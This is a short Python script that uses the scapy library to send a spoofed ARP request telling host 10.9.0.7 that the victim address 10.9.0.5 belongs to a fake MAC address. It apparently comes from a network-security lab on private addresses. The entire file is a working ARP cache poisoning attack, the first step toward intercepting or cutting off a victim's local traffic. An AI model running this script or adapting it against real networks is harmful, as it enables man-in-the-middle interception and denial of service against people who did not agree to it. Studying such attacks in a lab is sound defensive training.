#!/usr/bin/env python3
from scapy.all import *

IP_M = "10.9.0.7"
MAC_M = "02:42:0a:09:00:69"

VICTIM_IP = "10.9.0.5"
FAKE_MAC = "aa:bb:cc:dd:ee:ff"

print("Sending spoofed apr request . . .")

ether = Ether(src=FAKE_MAC, dst=MAC_M)
arp = ARP()
arp.psrc = VICTIM_IP
arp.hwsrc = FAKE_MAC
arp.dst = IP_M
arp.op = 1

frame = ether/arp
sendp(frame)